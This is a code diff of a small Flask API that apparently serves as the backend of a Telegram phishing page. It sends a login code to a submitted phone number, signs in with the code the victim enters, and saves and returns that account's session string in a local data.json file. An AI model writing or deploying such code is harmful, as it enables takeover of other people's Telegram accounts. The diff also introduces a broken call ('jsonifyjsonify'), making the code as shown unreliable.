@@ -1,60 +1,70 @@
-# api/send_code.py
+# app.py
 from flask import Flask, request, jsonify
-from telethon import TelegramClient
+from telethon.sync import TelegramClient
 from telethon.sessions import StringSession
 import os, json
 
 app = Flask(__name__)
 
-# ENV — WAJIB!
 API_ID = int(os.getenv('API_ID'))
 API_HASH = os.getenv('API_HASH')
-SESSION_STRING = os.getenv('SESSION_STRING')  # AKUN LO!
+SESSION_STRING = os.getenv('SESSION_STRING')
 
 DATA_FILE = 'data.json'
 
-def load(): 
-    return json.load(open(DATA_FILE, 'r')) if os.path.exists(DATA_FILE) else {}
-def save(d): 
-    json.dump(d, open(DATA_FILE, 'w'), indent=2)
+def load():
+    if os.path.exists(DATA_FILE):
+        with open(DATA_FILE, 'r') as f:
+            return json.load(f)
+    return {}
+
+def save(data):
+    with open(DATA_FILE, 'w') as f:
+        json.dump(data, f, indent=2)
+
+@app.route('/', methods=['GET'])
+def home():
+    return "<h1>JINX API JALAN!</h1><p>POST ke /send_code</p>"
 
 @app.route('/send_code', methods=['POST'])
-async def send_code():
+def send_code():
     phone = request.form.get('phone')
-    if not phone or not SESSION_STRING:
-        return jsonify({'success': False, 'error': 'missing'})
+    if not phone:
+        return jsonify({'success': False, 'error': 'no phone'})
+    if not SESSION_STRING:
+        return jsonify({'success': False, 'error': 'SESSION_STRING missing'})
 
     client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
-    await client.connect()
+    client.connect()
     try:
-        res = await client.send_code_request(phone)
-        return jsonify({'success': True, 'hash': res.phone_code_hash})
+        res = client.send_code_request(phone)
+        client.disconnect()
+        return jsonifyjsonify({'success': True, 'hash': res.phone_code_hash})
     except Exception as e:
+        client.disconnect()
         return jsonify({'success': False, 'error': str(e)})
-    finally:
-        await client.disconnect()
 
 @app.route('/login', methods=['POST'])
-async def login():
+def login():
     phone = request.form.get('phone')
     code = request.form.get('code')
     hash_code = request.form.get('hash')
-    if not all([phone, code, hash_code, SESSION_STRING]):
+    if not all([phone, code, hash_code]):
         return jsonify({'success': False, 'error': 'missing'})
 
     client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
-    await client.connect()
+    client.connect()
     try:
-        await client.sign_in(phone, code=code, phone_code_hash=hash_code)
+        client.sign_in(phone, code=code, phone_code_hash=hash_code)
         sess = client.session.save()
         data = load()
         data[phone] = {'session': sess}
         save(data)
+        client.disconnect()
         return jsonify({'success': True, 'session': sess})
     except Exception as e:
+        client.disconnect()
         return jsonify({'success': False, 'error': str(e)})
-    finally:
-        await client.disconnect()
 
 if __name__ == "__main__":
     app.run()
